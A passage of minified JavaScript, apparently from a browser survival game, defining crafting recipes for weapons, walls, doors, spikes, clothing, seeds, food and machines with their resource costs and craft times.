                    id: u.GOLD_SPEAR,
                    id2: Be.GOLD_SPEAR,
                    t: ae,
                    time: .05
                }, {
                    r: [[Be.WOOD, 200], [Be.DIAMOND, 40], [Be.GOLD, 60], [Be.GOLD_SPEAR, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_SPEAR,
                    id2: Be.DIAMOND_SPEAR,
                    time: 1 / 30,
                    t: ae
                }, {
                    r: [[Be.AMETHYST, 40], [Be.DIAMOND, 80], [Be.GOLD, 90], [Be.DIAMOND_SPEAR, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_SPEAR,
                    id2: Be.AMETHYST_SPEAR,
                    time: 1 / 60,
                    t: ae
                }, {
                    r: [[Be.REIDITE, 40], [Be.AMETHYST, 80], [Be.DIAMOND, 90], [Be.AMETHYST_SPEAR, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_SPEAR,
                    id2: Be.REIDITE_SPEAR,
                    time: 1 / 90,
                    t: ae
                }, {
                    r: [[Be.BLUE_CORD, 20], [Be.DRAGON_ORB, 1], [Be.AMETHYST, 100], [Be.DRAGON_HEART, 3]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.DRAGON_SPEAR,
                    id2: Be.DRAGON_SPEAR,
                    time: 1 / 120,
                    t: ae
                }, {
                    r: [[Be.DRAGON_SPEAR, 1], [Be.LAVA_ORB, 1], [Be.REIDITE, 100], [Be.LAVA_HEART, 2]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.LAVA_SPEAR,
                    id2: Be.LAVA_SPEAR,
                    time: .005,
                    t: ae
                }, {
                    r: [[Be.WOOD_SPEAR, 1], [Be.CRAB_LOOT, 5], [Be.CORD, 6]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.CRAB_SPEAR,
                    id2: Be.CRAB_SPEAR,
                    time: 1 / 30,
                    t: ae
                }, {
                    r: [[Be.WOOD, 30]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SWORD_WOOD,
                    id2: Be.SWORD_WOOD,
                    time: .2,
                    t: ae
                }, {
                    r: [[Be.WOOD, 50], [Be.STONE, 25], [Be.SWORD_WOOD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SWORD,
                    id2: Be.SWORD,
                    time: .1,
                    t: ae
                }, {
                    r: [[Be.WOOD, 60], [Be.GOLD, 40], [Be.STONE, 50], [Be.SWORD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SWORD_GOLD,
                    id2: Be.SWORD_GOLD,
                    time: .05,
                    t: ae
                }, {
                    r: [[Be.DIAMOND, 40], [Be.GOLD, 60], [Be.STONE, 80], [Be.SWORD_GOLD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SWORD_DIAMOND,
                    id2: Be.SWORD_DIAMOND,
                    time: 1 / 30,
                    t: ae
                }, {
                    r: [[Be.DIAMOND, 60], [Be.GOLD, 100], [Be.AMETHYST, 40], [Be.SWORD_DIAMOND, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SWORD_AMETHYST,
                    id2: Be.SWORD_AMETHYST,
                    time: 1 / 60,
                    t: ae
                }, {
                    r: [[Be.DIAMOND, 100], [Be.AMETHYST, 80], [Be.REIDITE, 40], [Be.SWORD_AMETHYST, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_SWORD,
                    id2: Be.REIDITE_SWORD,
                    time: 1 / 90,
                    t: ae
                }, {
                    r: [[Be.PLANT, 3]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.SEED,
                    id2: Be.SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.WILD_WHEAT, 3]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.WHEAT_SEED,
                    id2: Be.WHEAT_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.PUMPKIN, 8]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.PUMPKIN_SEED,
                    id2: Be.PUMPKIN_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.GARLIC, 8]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.GARLIC_SEED,
                    id2: Be.GARLIC_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.THORNBUSH, 8]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.THORNBUSH_SEED,
                    id2: Be.THORNBUSH_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.CARROT, 8]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.CARROT_SEED,
                    id2: Be.CARROT_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.TOMATO, 8]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.TOMATO_SEED,
                    id2: Be.TOMATO_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.WATERMELON, 16]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.WATERMELON_SEED,
                    id2: Be.WATERMELON_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.ALOE_VERA, 16]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.ALOE_VERA_SEED,
                    id2: Be.ALOE_VERA_SEED,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.MEAT, 1]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.COOKED_MEAT,
                    id2: Be.COOKED_MEAT,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.FOODFISH, 1]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.FOODFISH_COOKED,
                    id2: Be.FOODFISH_COOKED,
                    time: 1 / 3,
                    t: _e
                }, {
                    r: [[Be.FLOUR, 3]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.BREAD,
                    id2: Be.BREAD,
                    time: 1 / 3,
                    t: _e
                }, {
                    r: [[Be.FLOUR, 3], [Be.PLANT, 1]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.COOKIE,
                    id2: Be.COOKIE,
                    time: 1 / 3,
                    t: _e
                }, {
                    r: [[Be.FLOUR, 5], [Be.PLANT, 2], [Be.ICE, 2]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.CAKE,
                    id2: Be.CAKE,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.CORD, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BANDAGE,
                    id2: Be.BANDAGE,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 20]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WALL,
                    id2: Be.WALL,
                    time: .2,
                    t: ue
                }, {
                    r: [[Be.WALL, 1], [Be.STONE, 17]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_WALL,
                    id2: Be.STONE_WALL,
                    time: .2,
                    t: ue
                }, {
                    r: [[Be.STONE_WALL, 1], [Be.GOLD, 14]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_WALL,
                    id2: Be.GOLD_WALL,
                    time: .2,
                    t: ue
                }, {
                    r: [[Be.GOLD_WALL, 1], [Be.DIAMOND, 11]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_WALL,
                    id2: Be.DIAMOND_WALL,
                    time: .2,
                    t: ue
                }, {
                    r: [[Be.DIAMOND_WALL, 1], [Be.AMETHYST, 8]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_WALL,
                    id2: Be.AMETHYST_WALL,
                    time: .2,
                    t: ue
                }, {
                    r: [[Be.AMETHYST_WALL, 1], [Be.REIDITE, 5]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_WALL,
                    id2: Be.REIDITE_WALL,
                    time: .2,
                    t: ue
                }, {
                    r: [[Be.WOOD, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_DOOR,
                    id2: Be.WOOD_DOOR,
                    time: 1 / 8,
                    t: ue
                }, {
                    r: [[Be.WOOD_DOOR, 1], [Be.STONE, 27]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_DOOR,
                    id2: Be.STONE_DOOR,
                    time: 1 / 8,
                    t: ue
                }, {
                    r: [[Be.STONE_DOOR, 1], [Be.GOLD, 24]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_DOOR,
                    id2: Be.GOLD_DOOR,
                    time: 1 / 8,
                    t: ue
                }, {
                    r: [[Be.GOLD_DOOR, 1], [Be.DIAMOND, 21]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_DOOR,
                    id2: Be.DIAMOND_DOOR,
                    time: 1 / 8,
                    t: ue
                }, {
                    r: [[Be.DIAMOND_DOOR, 1], [Be.AMETHYST, 18]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_DOOR,
                    id2: Be.AMETHYST_DOOR,
                    time: 1 / 8,
                    t: ue
                }, {
                    r: [[Be.AMETHYST_DOOR, 1], [Be.REIDITE, 15]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_DOOR,
                    id2: Be.REIDITE_DOOR,
                    time: 1 / 8,
                    t: ue
                }, {
                    r: [[Be.WALL, 1], [Be.WOOD, 40], [Be.STONE, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SPIKE,
                    id2: Be.SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.STONE_WALL, 1], [Be.STONE, 70]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_SPIKE,
                    id2: Be.STONE_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.GOLD_WALL, 1], [Be.GOLD, 40], [Be.STONE, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_SPIKE,
                    id2: Be.GOLD_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.DIAMOND_WALL, 1], [Be.DIAMOND, 40], [Be.STONE, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_SPIKE,
                    id2: Be.DIAMOND_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.AMETHYST_WALL, 1], [Be.AMETHYST, 40], [Be.STONE, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_SPIKE,
                    id2: Be.AMETHYST_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.REIDITE_WALL, 1], [Be.REIDITE, 40], [Be.GOLD, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_SPIKE,
                    id2: Be.REIDITE_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.WOOD_DOOR, 1], [Be.WOOD, 80], [Be.STONE, 60]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_DOOR_SPIKE,
                    id2: Be.WOOD_DOOR_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.STONE_DOOR, 1], [Be.STONE, 140]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_DOOR_SPIKE,
                    id2: Be.STONE_DOOR_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.GOLD_DOOR, 1], [Be.GOLD, 80], [Be.STONE, 60]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_DOOR_SPIKE,
                    id2: Be.GOLD_DOOR_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.DIAMOND_DOOR, 1], [Be.DIAMOND, 80], [Be.STONE, 60]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_DOOR_SPIKE,
                    id2: Be.DIAMOND_DOOR_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.AMETHYST_DOOR, 1], [Be.AMETHYST, 80], [Be.STONE, 60]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_DOOR_SPIKE,
                    id2: Be.AMETHYST_DOOR_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.REIDITE_DOOR, 1], [Be.REIDITE, 80], [Be.GOLD, 60]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_DOOR_SPIKE,
                    id2: Be.REIDITE_DOOR_SPIKE,
                    time: .05,
                    t: ue
                }, {
                    r: [[Be.WOOD, 25], [Be.GOLD, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.CHEST,
                    id2: Be.CHEST,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.PAPER, 1], [Be.FUR, 1], [Be.CORD, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EXPLORER_HAT,
                    id2: Be.EXPLORER_HAT,
                    time: .2,
                    t: se
                }, {
                    r: [[Be.PAPER, 5], [Be.PENGUIN_FEATHER, 20], [Be.BLUE_CORD, 5], [Be.FUR, 5]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PIRATE_HAT,
                    id2: Be.PIRATE_HAT,
                    time: 1 / 30,
                    t: se
                }, {
                    r: [[Be.PILOT_GLASSES, 1], [Be.HAWK_FEATHER, 8], [Be.VULTURE_FEATHER, 8], [Be.PENGUIN_FEATHER, 8], [Be.CORD, 6]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PILOT_HELMET,
                    id2: Be.PILOT_HELMET,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.FUR, 1], [Be.CORD, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EARMUFFS,
                    id2: Be.EARMUFFS,
                    time: .2,
                    t: se
                }, {
                    r: [[Be.EARMUFFS, 1], [Be.FUR_WOLF, 5], [Be.CORD, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.COAT,
                    id2: Be.COAT,
                    time: 1 / 12,
                    t: se
                }, {
                    r: [[Be.COAT, 1], [Be.FUR_WINTER, 5], [Be.BLUE_CORD, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.CAP_SCARF,
                    id2: Be.CAP_SCARF,
                    time: 1 / 30,
                    t: se
                }, {
                    r: [[Be.CAP_SCARF, 1], [Be.FUR_WINTER, 5], [Be.FUR_MAMMOTH, 10], [Be.BLUE_CORD, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.FUR_HAT,
                    id2: Be.FUR_HAT,
                    time: .02,
                    t: se
                }, {
                    r: [[Be.WOOD, 50]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_HELMET,
                    id2: Be.WOOD_HELMET,
                    time: .2,
                    t: se
                }, {
                    r: [[Be.STONE, 75], [Be.WOOD, 75], [Be.WOOD_HELMET, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_HELMET,
                    id2: Be.STONE_HELMET,
                    time: .1,
                    t: se
                }, {
                    r: [[Be.STONE, 90], [Be.WOOD, 90], [Be.GOLD, 90], [Be.STONE_HELMET, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_HELMET,
                    id2: Be.GOLD_HELMET,
                    time: .05,
                    t: se
                }, {
                    r: [[Be.STONE, 100], [Be.GOLD, 100], [Be.DIAMOND, 100], [Be.GOLD_HELMET, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_HELMET,
                    id2: Be.DIAMOND_HELMET,
                    time: 1 / 30,
                    t: se
                }, {
                    r: [[Be.AMETHYST, 80], [Be.GOLD, 150], [Be.DIAMOND, 120], [Be.DIAMOND_HELMET, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_HELMET,
                    id2: Be.AMETHYST_HELMET,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.REIDITE, 80], [Be.DIAMOND, 150], [Be.AMETHYST, 120], [Be.AMETHYST_HELMET, 1]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_HELMET,
                    id2: Be.REIDITE_HELMET,
                    time: 1 / 90,
                    t: se
                }, {
                    r: [[Be.SCALES, 2], [Be.DIAMOND, 40], [Be.CORD, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIVING_MASK,
                    id2: Be.DIVING_MASK,
                    time: .05,
                    t: se
                }, {
                    r: [[Be.DIVING_MASK, 1], [Be.GOLD, 80], [Be.KRAKEN_SKIN, 1], [Be.AMETHYST, 20]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SUPER_DIVING_SUIT,
                    id2: Be.SUPER_DIVING_SUIT,
                    time: 1 / 90,
                    t: se
                }, {
                    r: [[Be.FLAME, 5], [Be.DIAMOND, 50], [Be.BLUE_CORD, 5]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_PROTECTION,
                    id2: Be.DIAMOND_PROTECTION,
                    time: .05,
                    t: se
                }, {
                    r: [[Be.DIAMOND_PROTECTION, 1], [Be.FLAME, 10], [Be.AMETHYST, 50]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_PROTECTION,
                    id2: Be.AMETHYST_PROTECTION,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.AMETHYST_PROTECTION, 1], [Be.FLAME, 15], [Be.AMETHYST, 50], [Be.REIDITE, 50]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.REIDITE_PROTECTION,
                    id2: Be.REIDITE_PROTECTION,
                    time: 1 / 90,
                    t: se
                }, {
                    r: [[Be.CORD, 4], [Be.FUR_BOAR, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.TURBAN1,
                    id2: Be.TURBAN1,
                    time: 1 / 15,
                    t: se
                }, {
                    r: [[Be.TURBAN1, 1], [Be.CORD, 6], [Be.FUR_BOAR, 4], [Be.VULTURE_FEATHER, 12], [Be.PENGUIN_FEATHER, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.TURBAN2,
                    id2: Be.TURBAN2,
                    time: 1 / 150,
                    t: se
                }, {
                    r: [[Be.CORD, 6], [Be.FUR_WOLF, 5]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BAG,
                    id2: Be.BAG,
                    time: 1 / 15,
                    t: se
                }, {
                    r: [[Be.WOOD, 20]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.PAPER,
                    id2: Be.PAPER,
                    time: 1 / 3,
                    t: Ee
                }, {
                    r: [[Be.DIAMOND, 1], [Be.CORD, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BLUE_CORD,
                    id2: Be.BLUE_CORD,
                    time: 1 / 3,
                    t: Ee
                }, {
                    r: [[Be.GOLD, 10]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.LOCK,
                    id2: Be.LOCK,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.GOLD, 250]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.LOCKPICK,
                    id2: Be.LOCKPICK,
                    time: 1 / 60,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.TOTEM,
                    id2: Be.TOTEM,
                    time: .1,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 15]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BRIDGE,
                    id2: Be.BRIDGE,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.ROOF,
                    id2: Be.ROOF,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 120]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_TOWER,
                    id2: Be.WOOD_TOWER,
                    time: 1 / 15,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 20], [Be.GROUND, 15]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.PLOT,
                    id2: Be.PLOT,
                    time: .2,
                    t: Ee
                }, {
                    r: [[Be.SAND, 25]],
                    w: 1,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.BOTTLE_EMPTY,
                    id2: Be.BOTTLE_EMPTY,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.BOTTLE_EMPTY, 1]],
                    w: 0,
                    f: 0,
                    o: 1,
                    e: 0,
                    id: u.BOTTLE_FULL,
                    id2: Be.BOTTLE_FULL,
                    time: .2,
                    t: _e
                }, {
                    r: [[Be.ICE, 20], [Be.BOTTLE_EMPTY, 1]],
                    w: 0,
                    f: 1,
                    o: 0,
                    e: 0,
                    id: u.BOTTLE_FULL_2,
                    id2: Be.BOTTLE_FULL,
                    time: .1,
                    t: _e
                }, {
                    r: [[Be.BOTTLE_EMPTY, 1]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 1,
                    id: u.BOTTLE_FULL_3,
                    id2: Be.BOTTLE_FULL,
                    time: 1 / 3,
                    t: _e
                }, {
                    r: [[Be.WOOD, 60], [Be.STONE, 20], [Be.CORD, 2]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WINDMILL,
                    id2: Be.WINDMILL,
                    time: .1,
                    t: Ee
                }, {
                    r: [[Be.DIAMOND, 40], [Be.STONE, 45]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.RESURRECTION,
                    id2: Be.RESURRECTION,
                    time: .05,
                    t: Ee
                }, {
                    r: [[Be.RESURRECTION, 1], [Be.EMERALD, 40], [Be.SANDWORM_JUICE, 1]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.EMERALD_MACHINE,
                    id2: Be.EMERALD_MACHINE,
                    time: .005,
                    t: Ee
                }, {
                    r: [[Be.WOOD, 50], [Be.STONE, 100]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EXTRACTOR_MACHINE_STONE,
                    id2: Be.EXTRACTOR_MACHINE_STONE,
                    time: 1 / 90,
                    t: Ee
                }, {
                    r: [[Be.STONE, 60], [Be.GOLD, 120]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EXTRACTOR_MACHINE_GOLD,
                    id2: Be.EXTRACTOR_MACHINE_GOLD,
                    time: 1 / 90,
                    t: Ee
                }, {
                    r: [[Be.GOLD, 70], [Be.DIAMOND, 140]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EXTRACTOR_MACHINE_DIAMOND,
                    id2: Be.EXTRACTOR_MACHINE_DIAMOND,
                    time: 1 / 90,
                    t: Ee
                }, {
                    r: [[Be.DIAMOND, 80], [Be.AMETHYST, 160]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EXTRACTOR_MACHINE_AMETHYST,
                    id2: Be.EXTRACTOR_MACHINE_AMETHYST,
                    time: 1 / 90,
                    t: Ee
                }, {
                    r: [[Be.AMETHYST, 90], [Be.REIDITE, 180]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.EXTRACTOR_MACHINE_REIDITE,
                    id2: Be.EXTRACTOR_MACHINE_REIDITE,
                    time: 1 / 90,
                    t: Ee
                }, {
                    r: [[Be.STONE, 70]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SPANNER,
                    id2: Be.SPANNER,
                    time: .1,
                    t: oe
                }, {
                    r: [[Be.STONE, 70], [Be.WOOD, 50]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.MACHETE,
                    id2: Be.MACHETE,
                    time: .1,
                    t: oe
                }, {
                    r: [[Be.WOOD, 40], [Be.STONE, 40]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.BREAD_OVEN,
                    id2: Be.BREAD_OVEN,
                    time: .1,
                    t: Ee
                }, {
                    r: [[Be.BREAD, 1], [Be.COOKED_MEAT, 1]],
                    w: 0,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.SANDWICH,
                    id2: Be.SANDWICH,
                    time: 1 / 3,
                    t: _e
                }, {
                    r: [[Be.BLUE_CORD, 30], [Be.DRAGON_CUBE, 1], [Be.AMETHYST, 150], [Be.DRAGON_HEART, 3]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.DRAGON_HELMET,
                    id2: Be.DRAGON_HELMET,
                    time: 1 / 120,
                    t: se
                }, {
                    r: [[Be.DRAGON_HELMET, 1], [Be.LAVA_CUBE, 1], [Be.REIDITE, 150], [Be.LAVA_HEART, 2]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.LAVA_HELMET,
                    id2: Be.LAVA_HELMET,
                    time: 1 / 180,
                    t: se
                }, {
                    r: [[Be.GOLD_HELMET, 1], [Be.CRAB_LOOT, 10], [Be.CRAB_STICK, 10], [Be.CORD, 10]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.CROWN_CRAB,
                    id2: Be.CROWN_CRAB,
                    time: 1 / 60,
                    t: se
                }, {
                    r: [[Be.BLUE_CORD, 20], [Be.DRAGON_ORB, 1], [Be.AMETHYST, 150], [Be.DRAGON_HEART, 3]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.DRAGON_SWORD,
                    id2: Be.DRAGON_SWORD,
                    time: 1 / 120,
                    t: ae
                }, {
                    r: [[Be.DRAGON_SWORD, 1], [Be.LAVA_ORB, 1], [Be.REIDITE, 150], [Be.LAVA_HEART, 2]],
                    w: 1,
                    f: 1,
                    o: 1,
                    e: 0,
                    id: u.LAVA_SWORD,
                    id2: Be.LAVA_SWORD,
                    time: 1 / 180,
                    t: ae
                }, {
                    r: [[Be.WOOD, 100], [Be.CORD, 4]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_BOW,
                    id2: Be.WOOD_BOW,
                    time: .05,
                    t: ae
                }, {
                    r: [[Be.WOOD, 30]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.WOOD_ARROW,
                    id2: Be.WOOD_ARROW,
                    time: .2,
                    t: ae
                }, {
                    r: [[Be.STONE, 200], [Be.CORD, 8], [Be.PENGUIN_FEATHER, 4], [Be.WOOD_BOW, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_BOW,
                    id2: Be.STONE_BOW,
                    time: .04,
                    t: ae
                }, {
                    r: [[Be.STONE, 20], [Be.HAWK_FEATHER, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.STONE_ARROW,
                    id2: Be.STONE_ARROW,
                    time: .2,
                    t: ae
                }, {
                    r: [[Be.GOLD, 200], [Be.CORD, 12], [Be.HAWK_FEATHER, 4], [Be.PENGUIN_FEATHER, 4], [Be.STONE_BOW, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_BOW,
                    id2: Be.GOLD_BOW,
                    time: 1 / 30,
                    t: ae
                }, {
                    r: [[Be.GOLD, 20], [Be.PENGUIN_FEATHER, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.GOLD_ARROW,
                    id2: Be.GOLD_ARROW,
                    time: .1,
                    t: ae
                }, {
                    r: [[Be.DIAMOND, 200], [Be.BLUE_CORD, 10], [Be.HAWK_FEATHER, 8], [Be.PENGUIN_FEATHER, 8], [Be.GOLD_BOW, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_BOW,
                    id2: Be.DIAMOND_BOW,
                    time: 1 / 35,
                    t: ae
                }, {
                    r: [[Be.DIAMOND, 10], [Be.PENGUIN_FEATHER, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.DIAMOND_ARROW,
                    id2: Be.DIAMOND_ARROW,
                    time: .1,
                    t: ae
                }, {
                    r: [[Be.AMETHYST, 200], [Be.BLUE_CORD, 10], [Be.PENGUIN_FEATHER, 8], [Be.VULTURE_FEATHER, 8], [Be.DIAMOND_BOW, 1]],
                    w: 1,
                    f: 0,
                    o: 0,
                    e: 0,
                    id: u.AMETHYST_BOW,
                    id2: Be.AMETHYST_BOW,
                    time: .025,
                    t: ae
                }, {
                    r: [[Be.AMETHYST, 10], [Be.VULTURE_FEATHER, 1]],
                    w: 1,
